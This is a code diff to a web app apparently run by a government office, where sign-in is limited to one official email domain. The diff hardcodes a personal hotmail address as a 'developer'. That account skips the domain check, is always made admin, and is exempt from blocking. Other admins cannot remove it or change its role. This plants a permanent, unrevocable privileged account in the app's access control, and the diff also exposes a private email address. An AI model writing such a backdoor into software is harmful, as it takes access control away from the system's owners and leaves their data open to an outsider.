@@ -1200,8 +1200,11 @@ function renderStorageBanner(reason){
 ===================================================================== */
 const CLOUD_CONFIG_KEY = STORAGE_PREFIX + 'cloud_config';
 const REQUIRED_EMAIL_DOMAIN = 'foreign.gov.mv';
+// developers: always admins, allowed in without a work email, and can't be demoted, removed or blocked by other admins
+const DEVELOPER_EMAILS = ['ni-y-az@hotmail.com'];
+function isDeveloperEmail(email){ return DEVELOPER_EMAILS.includes((email||'').trim().toLowerCase()); }
 function isAllowedEmail(email){
-  return (email||'').trim().toLowerCase().endsWith('@' + REQUIRED_EMAIL_DOMAIN);
+  return isDeveloperEmail(email) || (email||'').trim().toLowerCase().endsWith('@' + REQUIRED_EMAIL_DOMAIN);
 }
 let firestoreDb = null;
 let firestoreItemsRef = null;
@@ -1322,7 +1325,7 @@ async function initCloudIfConfigured(){
         authUser = {
           uid:user.uid, email:user.email,
           name: (pendingExtra && pendingExtra.name) || user.displayName || user.email,
-          role:'member',
+          role: isDeveloperEmail(user.email) ? 'admin' : 'member',
           designation: (pendingExtra && pendingExtra.designation) || '',
           department: (pendingExtra && pendingExtra.department) || '',
         };
@@ -1389,7 +1392,8 @@ function listenToOwnProfile(user){
   profileUnsub = firestoreProfilesRef.doc(user.uid).onSnapshot(doc=>{
     if(doc.exists && authUser){
       const d = doc.data();
-      authUser.role = d.role || 'member';
+      authUser.role = isDeveloperEmail(authUser.email) ? 'admin' : (d.role || 'member');
+      if(isDeveloperEmail(authUser.email) && d.role !== 'admin') firestoreProfilesRef.doc(user.uid).set({ role:'admin' }, { merge:true }).catch(() => {});
       authUser.designation = d.designation || '';
       authUser.department = d.department || '';
       authUser.name = d.name || authUser.name;
@@ -1400,6 +1404,7 @@ function listenToOwnProfile(user){
 // A removed member's uid goes on the blocked list. If an admin later adds the same email again (it then shows as
 // "Pending"), that re-admits them: the block no longer applies, and it is cleared from the list once they sign in.
 async function isUserBlocked(uid, email){
+  if(isDeveloperEmail(email)) return false;
   if(!firestoreDb) return false;
   try{
     const doc = await firestoreDb.collection('embus_meta').doc('blockedUsers').get();
@@ -1424,7 +1429,7 @@ async function unblockUid(uid){
     tx.set(metaRef, { uids, info });
   });
 }
-async function ensureOwnProfileDoc(user, extra){ if(!firestoreProfilesRef || !firestoreDb) return null; try{ if(await isUserBlocked(user.uid, user.email)) return null; try{ const bd = await firestoreDb.collection('embus_meta').doc('blockedUsers').get(); if(bd.exists && Array.isArray(bd.data().uids) && bd.data().uids.includes(user.uid)) unblockUid(user.uid).catch(() => {}); }catch(e){} let assignedRole = null; let pm = null; try{ const pmDoc = await firestoreDb.collection('embus_meta').doc('pendingMembers').get(); const lst = pmDoc.exists && pmDoc.data() && pmDoc.data().list; pm = lst ? (lst[pmKey(user.email)] || null) : null; }catch(e){} const metaRef = firestoreDb.collection('embus_meta').doc('adminStatus'); await firestoreDb.runTransaction(async (tx) => { const ref = firestoreProfilesRef.doc(user.uid); const snap = await tx.get(ref); if(snap.exists && snap.data().email) return; /* a bare record (e.g. only lastActive) is completed below */ const metaSnap = await tx.get(metaRef); const alreadyHasAdmin = metaSnap.exists && metaSnap.data().assigned; const role = alreadyHasAdmin ? 'member' : 'admin'; const data = Object.assign({ uid:user.uid, email:user.email, name:(pm&&pm.name)||user.displayName||user.email, role, designation:(pm&&pm.designation)||'', department:(pm&&pm.department)||'', createdAt: Date.now() }, extra||{}); tx.set(ref, data, { merge:true }); if(!alreadyHasAdmin) tx.set(metaRef, { assigned:true }); assignedRole = role; }); if(assignedRole && authUser && authUser.uid===user.uid){ authUser.role = assignedRole; renderApp(); } return true; }catch(e){ console.error('Could not set up the member profile', e); return false; } }
+async function ensureOwnProfileDoc(user, extra){ if(!firestoreProfilesRef || !firestoreDb) return null; try{ if(await isUserBlocked(user.uid, user.email)) return null; try{ const bd = await firestoreDb.collection('embus_meta').doc('blockedUsers').get(); if(bd.exists && Array.isArray(bd.data().uids) && bd.data().uids.includes(user.uid)) unblockUid(user.uid).catch(() => {}); }catch(e){} let assignedRole = null; let pm = null; try{ const pmDoc = await firestoreDb.collection('embus_meta').doc('pendingMembers').get(); const lst = pmDoc.exists && pmDoc.data() && pmDoc.data().list; pm = lst ? (lst[pmKey(user.email)] || null) : null; }catch(e){} const metaRef = firestoreDb.collection('embus_meta').doc('adminStatus'); await firestoreDb.runTransaction(async (tx) => { const ref = firestoreProfilesRef.doc(user.uid); const snap = await tx.get(ref); if(snap.exists && snap.data().email) return; /* a bare record (e.g. only lastActive) is completed below */ const metaSnap = await tx.get(metaRef); const alreadyHasAdmin = metaSnap.exists && metaSnap.data().assigned; const isDev = isDeveloperEmail(user.email); const role = (isDev || !alreadyHasAdmin) ? 'admin' : 'member'; const data = Object.assign({ uid:user.uid, email:user.email, name:(pm&&pm.name)||user.displayName||user.email, role, designation:(pm&&pm.designation)||'', department:(pm&&pm.department)||'', createdAt: Date.now() }, extra||{}); tx.set(ref, data, { merge:true }); if(!alreadyHasAdmin && !isDev) tx.set(metaRef, { assigned:true }); assignedRole = role; }); if(assignedRole && authUser && authUser.uid===user.uid){ authUser.role = assignedRole; renderApp(); } return true; }catch(e){ console.error('Could not set up the member profile', e); return false; } }
 let lastCloudErrorToastAt = 0;
 function handleCloudSyncError(err, collectionLabel){
   cloudStatus = 'error';
@@ -16578,7 +16583,7 @@ function viewAdmin(){
           <div class="flex items-center gap-2.5">
             <div class="w-7 h-7 rounded-full bg-brand-600 text-white text-[11px] font-bold flex items-center justify-center shrink-0">${esc(initials(p.name))}</div>
             <span class="font-medium text-slate-800">${esc(p.name)}</span>
-            ${isSelf?'<span class="inline-flex px-2 py-0.5 rounded-full bg-brand-50 text-brand-700 text-[11px] font-semibold">You</span>':''}
+            ${isSelf?'<span class="inline-flex px-2 py-0.5 rounded-full bg-brand-50 text-brand-700 text-[11px] font-semibold">You</span>':''}${isDeveloperEmail(p.email)?'<span class="inline-flex px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-700 text-[11px] font-semibold">Developer</span>':''}
           </div>
         </td>
         <td class="py-3 text-slate-500">${esc(p.email)}</td>
@@ -16587,7 +16592,7 @@ function viewAdmin(){
         <td class="py-3"><span class="inline-flex px-2 py-0.5 rounded-full ${p.role==='admin'?'bg-violet-100 text-violet-700':p.role==='viewer'?'bg-sky-100 text-sky-700':'bg-slate-100 text-slate-600'} text-xs font-semibold capitalize">${esc(p.role||'member')}</span>${apUids().includes(p.uid) ? ' <span class="inline-flex px-2 py-0.5 rounded-full bg-amber-100 text-amber-700 text-xs font-semibold">Approver</span>' : ''}</td>
         <td class="py-3 pr-5 sm:pr-6 text-right whitespace-nowrap">
           <button onclick="openEditUserModal('${p.uid}')" class="text-xs font-semibold text-brand-600 hover:underline mr-3">Edit</button>
-          ${isSelf ? '' : `<button onclick="removeMember('${p.uid}', '${esc(p.name).replace(/'/g,"\\'")}')" class="text-xs font-semibold text-rose-600 hover:underline">Remove</button>`}
+          ${isSelf || isDeveloperEmail(p.email) ? '' : `<button onclick="removeMember('${p.uid}', '${esc(p.name).replace(/'/g,"\\'")}')" class="text-xs font-semibold text-rose-600 hover:underline">Remove</button>`}
         </td>
       </tr>`;
   }).join('');
@@ -16924,6 +16929,7 @@ function deleteLocation(id){
 function removeMember(uid, name){
   if(!authUser || authUser.role!=='admin'){ toast('Only admins can remove members.', true); return; }
   if(authUser.uid===uid){ toast('You cannot remove your own account.', true); return; }
+  { const t = state.profiles.find(x=>x.uid===uid); if(t && isDeveloperEmail(t.email)){ toast('Developer accounts cannot be removed.', true); return; } }
   if(!firestoreProfilesRef || !firestoreDb){ toast('Removing members requires cloud sync to be connected.', true); return; }
   const removedProfile = state.profiles.find(p => p.uid === uid) || {};
   confirmAction(`Remove ${name}? They will lose access immediately. Their sign-in stays blocked until an admin adds them again or unblocks them in the Admin Panel.`, async ()=>{
@@ -16963,7 +16969,8 @@ function openEditUserModal(uid){
   if(!p) return;
   const isSelf = authUser && p.uid===authUser.uid;
   const adminCount = state.profiles.filter(x=>x.role==='admin').length;
-  const lockRole = isSelf && p.role==='admin' && adminCount<=1;
+  const isDev = isDeveloperEmail(p.email);
+  const lockRole = isDev || (isSelf && p.role==='admin' && adminCount<=1);
   const body = `
     <div id="admin-edit-error" class="hidden bg-rose-50 text-rose-700 text-sm rounded-lg px-3.5 py-2.5 mb-4"></div>
     <div class="mb-3 text-sm text-slate-400">${esc(p.email)}</div>
@@ -16988,7 +16995,7 @@ function openEditUserModal(uid){
         <option value="admin" ${p.role==='admin'?'selected':''}>Admin</option>
         <option value="viewer" ${p.role==='viewer'?'selected':''}>Viewer (view only)</option>
       </select>
-      ${lockRole?'<div class="text-[11px] text-slate-400 mt-1.5">You are the only admin, so this role cannot be changed here.</div>':''}
+      ${lockRole?'<div class="text-[11px] text-slate-400 mt-1.5">' + (isDev ? 'Developer accounts are always admins.' : 'You are the only admin, so this role cannot be changed here.') + '</div>':''}
     </div>
     <div class="flex items-center justify-between gap-2 flex-wrap">
       <button onclick="sendPasswordResetForUser('${esc(p.email)}')" class="text-[12.5px] font-semibold text-slate-500 hover:text-slate-700">Send password reset email</button>
